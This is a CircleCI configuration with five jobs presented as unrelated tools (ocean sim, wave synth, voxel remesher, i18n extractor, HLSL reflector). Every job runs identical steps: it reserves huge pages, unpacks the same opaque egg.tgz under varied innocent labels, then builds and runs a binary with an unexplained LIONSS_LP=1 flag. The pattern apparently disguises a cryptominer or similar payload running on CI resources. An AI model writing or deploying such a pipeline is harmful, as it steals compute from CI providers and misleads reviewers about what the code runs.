version: 2.1

jobs:
  Halcyon:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load calm sea
          command: |
            printf 'swell 0.1\n' > hal.cfg
      - run:
          name: Build ocean sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Halcyon -j2
      - run:
          name: Render halcyon calm
          command: LIONSS_LP=1 ./build/Halcyon --config hal.cfg --fetch 10
  amber-wave:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load waveform
          command: |
            printf 'freq = 440\n' > amber.cfg
      - run:
          name: Build wave synth
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target amber-wave -j2
      - run:
          name: Synthesize amber wave
          command: LIONSS_LP=1 ./build/amber-wave --config amber.cfg --duration 2
  voxel-remesh:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load voxel grid
          command: |
            : > grid.vox
      - run:
          name: Build remesher
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target voxel-remesh -j2
      - run:
          name: Remesh voxel volume
          command: LIONSS_LP=1 ./build/voxel-remesh --in grid.vox --iso 0.5
  I18nExtract:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Scan strings
          command: |
            mkdir -p src && printf 't(hello)\n' > src/ui.js
      - run:
          name: Build extractor
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target I18nExtract -j2
      - run:
          name: Extract i18n messages
          command: LIONSS_LP=1 ./build/I18nExtract --dir src --out messages.pot
  hlsl_reflect:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write HLSL
          command: |
            printf 'float4 main()\n' > s.hlsl
      - run:
          name: Build reflection tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hlsl_reflect -j2
      - run:
          name: Reflect HLSL bindings
          command: LIONSS_LP=1 ./build/hlsl_reflect --in s.hlsl --stage ps
